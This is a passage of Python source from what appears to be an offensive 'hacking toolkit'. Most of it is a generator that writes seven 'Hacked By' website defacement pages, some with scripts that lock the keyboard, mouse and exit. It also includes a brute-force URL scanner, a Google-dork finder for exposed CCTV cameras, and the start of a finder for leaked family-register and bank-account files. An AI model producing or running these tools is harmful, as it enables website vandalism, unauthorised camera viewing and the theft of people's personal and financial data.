    sprint(panel(f"{M}[{P}01{M}] {P}Deface V1\n{M}[{P}02{M}]{P} Deface V2\n{M}[{P}03{M}]{P} Deface V3\n{M}[{P}04{M}]{P} Deface V4\n{M}[{P}05{M}]{P} Deface V5\n{M}[{P}06{M}]{P} Deface V6\n{M}[{P}07{M}]{P} Deface V7",width=63,padding=(0,2),style="red"))
    df = input(f"{M}[{P}+{M}] {O}Select Menu : ")
    try:
        os.mkdir('Deface')
    except FileExistsError:
        pass
    if df in["01","1"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name : {P}")
        team = input(f"{M}[{P}+{M}] {O}Team name :{P} ")
        msg = input(f"{M}[{P}+{M}] {O}Message :{P} ")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : pstar7]: {P}")
        grts = input(f"{M}[{P}+{M}] {O}Greetz : {P}")
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]: {P}")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] : {P}")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] : {P}")
        if e:
            logo = e
        else:
            logs = ['https://kosred.com/a/saewlg.jpeg']
            logo = random.choice(logs)
        sc1 = f"""
        <font color="white">
        <head>
            <title>HackedBy{name}</title>
            <table width="100%" height="90%">
            <tbody><tr><td align="center">
        <br><br>
        <br><br><font color="white">
        <i>
    
        <script type="text/javascript">
        alert("Hacked By: {name}");
        </script>
    
        <meta charset="utf-8">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
        """
        sc2 = "{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"
        sc3 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
        r = "{return"
        i = "}"
        ueh = "{"
        oke = """;!function e(t){void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)}"""
        rr = f"""["{msg}"]{oke}"""
        sc4 = f"{ueh}var n={rr}"
        sc5 = f"""
        <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{sc2}</style><script language="JavaScript">function confirmExit(){r}"are you sure ? wkwk"{i}function fs(){sc3}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){sc4})</script><audio src="https://kosred.com/a/gavwen.mp3" autoplay="true" id="lagu" loop=""></audio><video id="background-video" src="https://kosred.com/a/oanknh.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="100%" height="80%"><tbody><tr><td><center><small>We ARE <red>{team}</red></small><br><img src="{logo}" width="{width}" height="{height}" Loading="Lazy" onerror="this.style.display=&quot;none&quot;"><font size="5"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
        </div>
        </font>
        </body>
        </p>
        </span>
        """
        sc = sc1 + sc5
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(f"{M}[{P}+{M}] {H}Success make file {file_name}.html")
                
                Continue()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
    
        logging(file_path, file_name)
    elif df in["02","2"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name : {P}")
        team = input(f"{M}[{P}+{M}] {O}Team name :{P} ")
        msg = input(f"{M}[{P}+{M}] {O}Message :{P} ")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : pstar7]: {P}")
        grts = input(f"{M}[{P}+{M}] {O}Greetz :{P} ")
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]:{P} ")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] : {P}")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] :{P} ")
        if e:
            logo = e
        else:
            logs = ['https://kosred.com/a/nkgiza.jpeg']
            logo = random.choice(logs)
        sc1 = f"""
        <head>
            <title>HackedBy{name}</title>
            <table width="100%" height="90%">
        <tbody><tr><td align="center">
    
        <meta charset="utf-8">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
        """
        idiot = """{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"""
        i2 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
        ess = """{return"are you sure ? wkwk"}"""
        wade = "{var n="
        jogja = """{void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)})"""
        uh = f"""{ess}function fs(){i2}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){wade}["{msg}"];!function e(t){jogja}"""
        sc2 = f"""
        <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{idiot}</style><script language="JavaScript">function confirmExit(){uh}</script>
        <video id="background-video" src="https://kosred.com/a/rkylam.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="{width}%" height="{height}%"><font size="5"><br>TEAM : {team}<br><img src="{logo}" style="width:300px; height:300px; border-width:0;"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
        <br>
        <audio controls src="https://kosred.com/a/jsmuvk.mp3">
        """
        sc = sc1 + sc2
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(H + f"Success make file {file_name}.html")
                Continue()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
    
        logging(file_path, file_name)
    elif df in["03","3"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name :{P} ")
        team = input(f"{M}[{P}+{M}] {O}Team name :{P} ")
        msg = input(f"{M}[{P}+{M}] {O}Message :{P} ")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : PSTAR7]: ")
        grts = input(f"{M}[{P}+{M}] {O}Greetz :{P} ")
        music = input(f"{M}[{P}+{M}] {O}Music URL : {P}")
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]:{P} ")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] : {P}")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] :{P} ")
        logs = ['https://kosred.com/a/ukchqj.jpeg']
        rdd = random.choice(logs)
        if e:
            logo = e
        else:
            logo = rdd
        sc1 = f"""
        <head>
            <title>Hacked By {name}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta charset="utf-8">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
        <table width="100%" height="90%">
          <tbody><tr><td align="center">
        <br><br>
        <br><br><font color="black">
        <i>
    
        <img src="{logo}" style="width:{width}px; height:{height}px; border-width:0;">
        </a><br>
    
        <title>Hacked By {name}</title>
    
        <div class="typewriter">
           <h1>Oh no! the security has been hacked!</h1>
           <h1>We Are <font color="red">{team}</font></h1>
        </div>
        </font>
    
        <b><br><font color="black"><font size="4">
        "{msg}" <br><br>
    
        <hacked>
        <br>
        <font size="3" color="red"> Greetz:</font><br>
    
        [<font color="red">{grts}</span> ]
        <body>
        <br><br>
    
        <audio autoplay="" controls src="{music}">
        </audio>
    
        </audio>
        </body>
        </html>
    
        </head>
        <body>
    
        <body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
        """
        sc = sc1
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(H + f"Success make file {file_name}.html")
                Continue()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
    
        logging(file_path, file_name)
    elif df in["04","4"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name :{P} ")
        team = input(f"{M}[{P}+{M}] {O}Team name :{P} ")
        msg = input(f"{M}[{P}+{M}] {O}Message : {P}")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : PSTAR7]: {P}")
        grts = input(f"{M}[{P}+{M}] {O}Greetz :{P} ")
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]: {P}")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] :{P} ")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] : {P}")
        logs = ['https://kosred.com/a/exvpkp.jpeg']
        rdd = random.choice(logs)
        if e:
            logo = e
        else:
            logo = rdd
        sc1 = f"""
        <html>
        <head>
            <title>Hacked By {name}</title>
        </head>
        <body bgcolor="black" >
        <center><font face="Courier new" size="24" color="lime"> We Are {team}  </font>
        <br><img src="{logo}"width="{width}"height="{height}">
        <br><h1><span style="color:#ffffff;font-family:Iceland;text-shadow:#FF0099 0px 0px 10px">[ Hacked By {name} ]</span></h1>
        <font face="Courier new" size="6" color="red"> {msg} </font>
        <br>
        <marquee behavior="scroll" direction="left" scrollamount="4" scrolldelay="55" width="100%">
        <font face="Courier New" size="5" font style="text-shadow: 0px 0px 20px blue;" color="blue">
        <b>-=| Greetz : {grts} |=-</font>
        </body>
        </html>
        """
        sc = sc1
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(f"{M}[{P}+{M}] {H}Success make file {file_name}.html")
                
                Continue()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
    
        logging(file_path, file_name)
    elif df in["05","5"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name : {P}")
        team = input(f"{M}[{P}+{M}] {O}Team name :{P} ")
        msg = input(f"{M}[{P}+{M}] {O}Message :{P} ")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : PSTAR7]: {P}")
        grts = input(f"{M}[{P}+{M}] {O}Greetz : {P}")
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]:{P} ")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] : {P}")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] : {P}")
        logs = ['https://kosred.com/a/wudeyr.jpeg']
        rdd = random.choice(logs)
        if e:
            logo = e
        else:
            logo = rdd
        style = """
        body {
                font-family: monospace;
                background-color: black;
                justify-content: center;
                text-align: center;
                font-color: white;
            }
    
            .message {
                font-color: gold;
                font-family: monospace;
                font-align: center;
            }
    
           .in {
                font-family: sans-serif;
                font-color: white;
            }
        """
        sc1 = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Hacked By {name}</title>
            <table width="100%" height="100%">
            <tbody><tr><td align="center">
            </head>
            <style>
            {style}
            </style>
            <body text="white">
            <p>Hacked By {name}</p><br>
            <img src="{logo}" width="{width}" height="{height}"><br><br>
            <font color="yellow" ><p class="message">MESSAGE : </p></font>
            <p class="in">{msg}</p><br><br>
            <p><font color="red" size="4">-= Greetz =-</font></p>
            <marquee>-= {grts} =-</marquee>
            <br><br><font color="gold" size="3"><p class="message">WE ARE :</p></font>
            <p>{team}</p>
        """
        sc = sc1
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(f"{M}[{P}+{M}] {H}Success make file {file_name}.html")
                
                Continue()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
    
        logging(file_path, file_name)
    elif df in["06","6"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name : {P}")
        msg = input(f"{M}[{P}+{M}] {O}Message : {P}")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : PSTAR7]: {P}")
        grts = input(f"{M}[{P}+{M}] {O}Greetz :{P} ")
        music = input(f"{M}[{P}+{M}] {O}Music URL :{P} ")
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]:{P} ")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] : {P}")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] : {P}")
        logs = ['https://pa1.narvii.com/5720/b5b2f3fc8e3cbd75c382b472a31c69ad4a4b3320_hq.gif']
        rdd = random.choice(logs)
        if e:
            logo = e
        else:
            logo = rdd
        st1 = """
        {display:table;height:100%;width:100%;} body{background-color:black; } body{display:table-cell;vertical-align:middle;text-align:center;} img { opacity:0.8; }
        """
        sc1 = f"""
        <!DOCTYPE html>
        <html lang="en"><head></head><body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">&lt;------------
        -------------- copyright {name} ------------&gt;
        <title>Hacked By {name}</title> <link href="https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet" type="text/css"> <meta content="Hacked By {name}" name="description"> <meta content="Hacked By {name}" name="keywords"> <meta content="Hacked By {name}" name="Abstract"> <meta name="title" content="Str0ng3"> <meta name="description" content=""> <meta name="keywords" content="Hacked"> <meta name="googlebot" content="index,follow"> <meta name="robots" content="all"> <meta name="robots schedule" content="auto"> <meta name="distribution" content="global"> <style type="text/css"> @import url('https://fonts.googleapis.com/css?family=Megrim'); html{st1} </style>   <center> <img src="{logo}" width="{width}" height="{height}"><br><br> <font face="Megrim" font="" color="white" size="6"><b>Hacked By {name}</b><br> </font></center> <center><font face="Shadows Into Light Two" color="#fff" size="3px">-=!!=- {msg} -=!!=-</font></center> <br> <font face="Shadows Into Light Two" color="#fff" size="3px">-= Greetz =-<br></font> <font face="Shadows Into Light Two" size="3px" color="#ff0000">=- {grts} -=<br></font>
        <audio src="{music}" loop="True" autoplay hidden></audio>
        </body></html>
        """
        sc = sc1
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(H + f"Success make file {file_name}.html")
                Continue ()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
    
        logging(file_path, file_name)
    elif df in["07","7"]:
        pass
        name = input(f"{M}[{P}+{M}] {O}Attacker name : {P}")
        team = input(f"{M}[{P}+{M}] {O}Team : {P}")
        msg = input(f"{M}[{P}+{M}] {O}Message : {P}")
        file_name = input(f"{M}[{P}+{M}] {O}Save as [e.x : pstar7]: {P}")
        greetz = input(f"{M}[{P}+{M}] {O}Greetz : {P}")
        m = input(f"{M}[{P}+{M}] {O}Music URL [Skip For Default Music] : {P}")
        logs = ['https://cdn.prinsh.com/data-1/mp3/best-hacker-music.mp3']
        rd = random.choice(logs)
        
        if m:
            music = m
        else:
            music = rd
        e = input(f"{M}[{P}+{M}] {O}Photo / Logo [Skip for default icon]: {P}")
        width = input(f"{M}[{P}+{M}] {O}Logo Width [Default : 300] : {P}")
        height = input(f"{M}[{P}+{M}] {O}Logo Height [Default : 300] : {P}")
        logs = ['https://cdn.prinsh.com/data-1/images/NathanPrinsley-IndonesianAnonymous.jpg']
        rdd = random.choice(logs)
        if e:
            logo = e
        else:
            logo = rdd
        scss = """
    <link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/><style>body{background: url("https://cdn.prinsh.com/data-1/images/NathanPrinsley-star.gif") no-repeat center center fixed;background-size:100% 100%;font-family:Calibri;margin-top:35px;}h1,h2{margin-top:.3em;margin-bottom:.3em;}h1.nprinsleyy{color:#de0707;}h2{color:#0000e3;}p.message_prinsley{color:#de0707;margin-top:.25em;margin-bottom:.25em;font-size:16px;font-weight:unset;}.hubungi_prinsh{color:#00eb00;text-decoration:none;}.hubungi_prinsh:hover{color:red}.othermes_nprinsh{color:#edc800;font-size:16px;}marquee.foonathanPrinsley{display:;position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; left: 0px; border-top: 2px solid darkred; padding: 5px; background-color: #000}</style>
        """
       
        sc1 = f"""
    <!DOCTYPE html><html><head><title>Hacked By {name} - {team} </title><meta charset="UTF-8"/><meta name="author" content="{name}"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="description" content="your sistem is hacked, please upgrade your Security "/><meta property="og:title" content="Hacked By {name} - {team} "/><meta name="keywords" content="{name} - {team} ,Hacked By {name},hacked by {name},hacked by MrPstar7 ,MrPstar7 haxor script deface generator, hacked by, haxor my id"/><meta property="og:image" content="https://cdn.prinsh.com/data-1/images/NathanPrinsley-IndonesianAnonymous.jpg"/><meta property="og:type" content="website"/> <meta property="og:site_name" content="Haxor Uploader"/><link rel="shortcut icon" type="image/x-icon" href="{logo}" />{scss}</head><body><center/><img src="{logo}" style="width: {width}" "height: {height}"><h1 class="nprinsleyy nprinsley-text-redan" style="font-size:32px;">Hacked By {name}</h1><h2 style="font-size:24px;" class="nprinsley-text-glitchan">{team} </h2><p class="message_prinsley nprinsley-detaxt">{msg} </p><audio src="{music}"  autoplay="1" loop="1"></audio><marquee class="foonathanPrinsley"><b style="color: #edc800;font-size:16px;" class="nathan-prinsley_none">Greetz To : {greetz}  </b></marquee></center><script src="https://cdn.prinsh.com/NathanPrinsley-effect/efek-salju.js" type="text/javascript"></script></body></html>
        """
        sc = sc1
        target_directory = 'Deface'
    
        file_path = os.path.join(target_directory, file_name)
    
        def logging(file_path, file_name):
            try:
                time.sleep(0.5)
                with open(file_path + ".html", "w") as file:
                    file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                print(f"{M}[{P}+{M}] {H}Success make file {file_name}.html")
                
                Continue()
                a()
            except FileExistsError:
                print(f"File {file_name}.html Already Exists !")
                Continue()
                a()
        logging(file_path, file_name)
        
    else:
        print(f"{M}Exit . .")
        Continue()
        a()
        
    class Scrape:
        timer
        def __init__(self, url):
            try:
                print(f"{M}[{P}+{M}] {O}Trying to scrape links from {M}'{url}'...")
                asyncio.run(self.scrape_links(url))
                success(f"Scraping completed..!")
            except Exception as e:
                error(f"Error: {e}")
                Continue()
                a()
        @staticmethod
        async def fetch(session, url):
            headers = {"User-Agent": f"{randomuser.IFeelLucky()}"}
            async with session.get(url, headers=headers) as response:
                return await response.text()
    
        @staticmethod
        async def parse_links(content):
            soup = BeautifulSoup(content, "html.parser")
            links = soup.find_all("a")
            return [(link.get("href"), link.text) for link in links]
    
        async def scrape_links(self, url):
            async with aiohttp.ClientSession() as session:
                html_content = await self.fetch(session, url)
                links = await self.parse_links(html_content)
    
                count = 0
                for href, text in links:
                    count += 1
                    success(f"Found {count} link(s): {href} - {text}")
                    Continue()
                    a()

class Scan:
    timer
    def __init__(self, domain):
        self.domain = domain
        self.url_set = set()

        print(f"{M}[{P}~{M}] {O}Scanning for valid URLs for '{domain}'..!")
        self.scan_urls()
        success(f"Scan Complete..! Found {len(self.url_set)} valid URLs!")

    @staticmethod
    def get_wordlist():
        try:
            content = read_local_content("data/wordlist.txt")
            return {line.strip() for line in content.splitlines() if line.strip()}
        except requests.exceptions.ConnectionError:
            return None

    async def fetch_url(self, session, path):
        
        url = f"https://{self.domain}/{path}"
        headers = {"User-Agent": f"{randomuser.IFeelLucky()}"}
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                print(f"{M}[{P}+{M}] {P} Found a valid URL : {H}{url}")
                self.url_set.add(url)

    async def scan_async(self, paths):
  
        async with aiohttp.ClientSession() as session:
            tasks = [self.fetch_url(session, path) for path in paths]
            await asyncio.gather(*tasks)

    def scan_urls(self):
        paths = self.get_wordlist()
        if paths is None:
            error("Connection Error..!")
            return

        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.scan_async(paths))
        except KeyboardInterrupt:
            error("Cancelled..!")
            Continue()
            a()
    
def cctv():
    lokasi = input(f'\n{M}[{P}+{M}] {O}Masukkan Lokasi / Daerah : {P}')
    dork = ['inurl ', 'intext ', 'intitle ', 'cgi ', 'view.shtml']
    dorkc = ['/view.shtml', 'cctv', 'CgiStart?page=', 'liveapplet', 'Webcam.html', 'EvoCam', 'view/view.shtml', 'cctv/view.shtml', 'cctv/index.shtml', 'cctv/index.php', 'cctv/index.html', "main.cgi", "view/index.shtml", "Compact Wireless-G Internet Video Camera", "inurl:fd.htm", "live/applet.htm", "VIVOTEK Network Camera", "viewerframe?mode=motion", "/cgi-bin/viewer/video.cgi", "Panasonic Network Camera", "/viewer/live/en/live.html", "Sony Network Camera SNC-RZ25", "view/view.shtml", "Live View / - AXIS", "Live View / - AXIS 206M", "Live View / - AXIS 206W", "/view/index.shtml", "/webcam.html", "Live View / - WebCam", "webcamXP 5", "Canon Network Camera", "/viewer/live/en/live.html", "Mobotix M22", "/control/event.jpg", "MOBOTIX M10", "MOBOTIX camera M1", "Canon Network Camera", "/viewer/live/en/live.html", "/view/index.shtml", "webcam.html", "Live View / - WebCam", "webcamXP 5"]
    
    for cctv in dork:
        try:
            rand_user = random.choice(user_agents)
            rand_ipv4 = random.choice(address)
            rand_ipv6 = random.choice(ip6)    
            print(f'{M}[{P}+{M}] {O}Searching CCTV...')    
            for hijacked in search(f'{cctv}cctv {cctv}{lokasi}'):
                print(f'{M}[{P}+{M}] {P}Found : {P}')
                print(f'{M}[{P}+{M}] {H}' + hijacked)
        except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(M + f'Please Wait')
                    time.sleep(4)
                    Continue()
                    a()  
    print(f'{H}CCTV Finder Done..')     
    Continue()
    a()        
    
def databs_find():
    from googlesearch import search 
    from requests.exceptions import ConnectionError
    from subprocess import getoutput
    from os.path import exists
    import urllib.request 
    from urllib.parse import urlparse
    clear()
    MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
    MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
    def randomipv4():
        return  ipaddress.IPv4Address._string_from_ip_int(
            random.randint(0, MAX_IPV4)
        )
    def randomipv6():
        return ipaddress.IPv6Address._string_from_ip_int(
            random.randint(0, MAX_IPV6)
        )
    address = randomipv4()
    ip6 = randomipv6()
    db1 = ['xls', 'pdf', 'csv', 'kartu-keluarga.pdf', 'kk.pdf', 'kk.xls', 'kk.xlsx', 'kk.csv', 'database/kk.pdf', 'admin/data/kk.pdf', 'kartukeluarga.pdf', 'pdf/kk.pdf', 'kk.csv', 'kartukeluarga.csv', 'admin/csv/kk.csv', 'database/kk.csv', 'admin/dataset/kk.csv', 'csv/kk.csv', 'kk.xls', 'database/kk.xls', 'admin/data/kk.xls', 'xls/kk.xls']
    db2 = ['xls', 'pdf', 'csv', 'rekening.pdf', 'rekening.xls', 'rekening.xlsx', 'rekening.csv', 'database/rekening.pdf', 'admin/data/rekening.pdf', 'rekening.pdf', 'pdf/rekening.pdf', 'rekening.csv', 'rekening.xlsx', 'admin/csv/rekening.csv', 'database/rekening.csv', 'admin/dataset/rekening.csv', 'csv/rekening.csv', 'rekening.xls', 'database/rekening.xls', 'admin/data/rekening.xls', 'xls/rekening.xls']
    print(
    f"""{M}
    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
